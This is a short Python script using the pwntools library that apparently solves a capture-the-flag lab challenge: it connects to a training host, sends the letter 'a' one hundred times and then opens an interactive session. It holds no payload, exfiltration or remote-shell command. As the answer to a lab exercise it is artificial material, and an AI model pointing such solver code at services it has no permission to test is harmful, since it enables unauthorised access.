from pwn import *

context.log_level = "error"

r = remote("lab.scist.org", 31012)

for _ in range(100):
    r.sendline(b"a")

r.interactive()
